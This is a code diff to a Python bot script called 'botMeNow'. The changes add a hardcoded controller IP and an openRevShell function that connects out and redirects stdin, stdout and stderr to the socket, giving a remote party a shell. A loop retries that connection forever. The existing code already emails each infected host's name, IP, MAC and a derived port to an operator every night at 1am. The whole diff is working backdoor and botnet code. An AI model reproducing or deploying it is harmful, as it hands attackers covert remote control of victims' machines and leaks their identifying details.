@@ -9,6 +9,9 @@ from uuid import getnode as get_mac
 import socket
 import smtplib
 
+global_port = 0
+Serv_IP= "111.111.111.111"
+
 def botMeNow():
     if not (os.path.isdir("/etc/botMeNow")):
         os.mkdir("/etc/botMeNow")                                   #create botmenow dir
@@ -32,9 +35,33 @@ def botMeNow():
 
     mac = get_mac()
     mac=':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
+
+    port = hashMacToPort(mac)
+    global_port = port
+    host = socket.gethostname()
+    ip = myIp()
+    sendMail(host, ip, mac, port)
+
+
+    return
+
+
+
+def openRevShell(port,ServerIP):
+    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    soc.connect((ServerIP, port))
+    os.dup2(soc.fileno(), 0)
+    os.dup2(soc.fileno(), 1)
+    os.dup2(soc.fileno(), 2)
+
+    return
+
+
+
+def hashMacToPort(mac):
     port_temp = 0
     m = mac[0:2]
-    i = int(m,16)
+    i = int(m, 16)
     port_temp += i
     m = mac[3:5]
     i = int(m, 16)
@@ -51,13 +78,7 @@ def botMeNow():
     m = mac[15:17]
     i = int(m, 16)
     port_temp += i
-
-    port = port_temp
-    host = socket.gethostname()
-    ip = myIp()
-    sendMail(host, ip, mac, port)
-
-    return
+    return port_temp
 
 def myIp():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -84,9 +105,12 @@ def sendMail(host, ip, mac, port):
     return
 
 while True:
-
     cur_time = time.localtime()
-    #print(cur_time.tm_hour)
-    if(cur_time.tm_hour==1 and cur_time.tm_min == 0):
-        botMeNow()                                  #run botMeNow function at 1:00am
+    if (cur_time.tm_hour == 1 and cur_time.tm_min == 0):
+        botMeNow()  # run botMeNow function at 1:00am
         time.sleep(60)
+
+    try:
+        openRevShell(global_port, Serv_IP)
+    except:
+            continue
